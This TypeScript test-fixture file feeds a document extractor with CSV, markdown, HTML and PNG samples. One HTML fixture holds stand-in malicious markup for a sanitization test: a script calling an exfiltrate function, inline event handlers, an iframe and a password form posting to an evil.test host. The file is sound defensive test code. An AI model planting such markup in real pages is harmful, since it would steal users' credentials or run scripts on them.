/**
 * Text-shaped fixtures — CSV, markdown and HTML — plus the PNG "no text path" fixture.
 *
 * These formats need no container, so they are literal source strings: what the fixture
 * says is exactly what the extractor is fed.
 */
import { deflateSync } from 'zlib';
import { crc32 } from './zip.util';

/**
 * CSV exercising every quoting/delimiter edge case the lenient parser must survive:
 * a quoted field containing the delimiter, an escaped `""` quote, an embedded newline
 * inside quotes, a literal pipe (which must be escaped in the markdown table), a
 * trailing empty field, and a short (ragged) row that has to be padded.
 */
export const CSV_EDGE_CASES = [
	'name,note,amount,owner',
	'"Smith, Jones",plain,45,ana',
	'"say ""hi""",quoted quote,12,bo',
	'"multi',
	'line",embedded newline,7,cy',
	'Pipes,tier a | tier b,3,di',
	'Ragged,short row',
	'Trailing,,0,'
].join('\n');

/** The same data as {@link CSV_EDGE_CASES} but semicolon-delimited (European export). */
export const CSV_SEMICOLON = ['name;amount;owner', 'Acme;120;ana', '"Smith; Jones";45;bo'].join('\n');

/** Tab-separated variant — the third delimiter the detector has to recognise. */
export const CSV_TAB = ['name\tamount\towner', 'Acme\t120\tana'].join('\n');

/**
 * Markdown fixture: heading hierarchy (which feeds `headingPath` in the chunker), inline
 * emphasis, a fenced code block, a list, a link, and a pipe table. The extractor is a
 * passthrough, so the assertion is that all of it survives byte-for-byte after
 * normalization.
 */
export const MARKDOWN_SOURCE = [
	'# Runbook',
	'',
	'## Restarting the API',
	'',
	'Run the **rollout** command and _wait_ for readiness.',
	'',
	'```bash',
	'kubectl rollout restart deploy/api',
	'```',
	'',
	'- check the pods',
	'- check the logs',
	'',
	'See [the dashboard](https://ever.co/dashboard).',
	'',
	'| Stage | Owner |',
	'| --- | --- |',
	'| build | ci |',
	''
].join('\n');

/**
 * HTML that *requires* sanitization: a `<script>`, an inline event handler, a `<style>`
 * block, an `<iframe>`, a `javascript:` link and a form. None of it may reach the
 * markdown; the surrounding text-level structure must.
 */
export const HTML_REQUIRING_SANITIZATION = [
	'<!DOCTYPE html>',
	'<html><head>',
	'<title>Security Policy</title>',
	'<style>body { background: url("https://tracker.test/x.png"); }</style>',
	'<script>window.exfiltrate("secret-token");</script>',
	'</head><body onload="alert(1)">',
	'<h1>Security Policy</h1>',
	'<p onclick="steal()">All laptops use <strong>full disk</strong> encryption.</p>',
	'<iframe src="https://evil.test/frame"></iframe>',
	'<p><a href="javascript:alert(2)">do not click</a> and',
	'<a href="https://ever.co/policy" target="_blank">the real policy</a>.</p>',
	'<ul><li>Rotate keys quarterly</li><li>Enable MFA</li></ul>',
	'<blockquote>Report incidents within one hour.</blockquote>',
	'<pre><code>openssl rand -hex 32</code></pre>',
	'<table><thead><tr><th>Control</th><th>Cadence</th></tr></thead>',
	'<tbody><tr><td>Key rotation</td><td>Quarterly</td></tr></tbody></table>',
	'<form action="https://evil.test/collect"><input name="password"></form>',
	'<img src="https://ever.co/logo.png" alt="logo">',
	'</body></html>'
].join('\n');

/**
 * HTML with a header-less table — the shape Word exports and hand-written pages use.
 * `turndown-plugin-gfm` only recognises a table whose first row is `<th>`, so this is the
 * fixture that proves header-less tables still become markdown rather than raw HTML.
 */
export const HTML_HEADERLESS_TABLE = [
	'<p>Expense limits:</p>',
	'<table><tr><td>Meals</td><td>40 USD</td></tr><tr><td>Travel</td><td>600 USD</td></tr></table>'
].join('');

/**
 * Builds a valid 1×1 PNG (signature + IHDR + IDAT + IEND, CRC-checked).
 *
 * PNG has no extractor: it exists to prove the **no-text path** — the registry resolves
 * nothing for `image/png` and reports a permanent "no extractor supports this file type"
 * failure until OCR ships (P1/M5).
 */
export function createPng(): Buffer {
	const chunk = (type: string, data: Buffer): Buffer => {
		const length = Buffer.alloc(4);
		length.writeUInt32BE(data.length, 0);
		const typeAndData = Buffer.concat([Buffer.from(type, 'latin1'), data]);
		const crc = Buffer.alloc(4);
		crc.writeUInt32BE(crc32(typeAndData), 0);
		return Buffer.concat([length, typeAndData, crc]);
	};

	const signature = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

	const ihdrData = Buffer.alloc(13);
	ihdrData.writeUInt32BE(1, 0); // width
	ihdrData.writeUInt32BE(1, 4); // height
	ihdrData[8] = 8; // bit depth
	ihdrData[9] = 2; // colour type: truecolour
	ihdrData[10] = 0; // compression
	ihdrData[11] = 0; // filter
	ihdrData[12] = 0; // interlace

	// One scanline: filter byte 0 followed by a single RGB pixel.
	const idatData = deflateSync(Buffer.from([0x00, 0x7f, 0x7f, 0x7f]));

	return Buffer.concat([
		signature,
		chunk('IHDR', ihdrData),
		chunk('IDAT', idatData),
		chunk('IEND', Buffer.alloc(0))
	]);
}
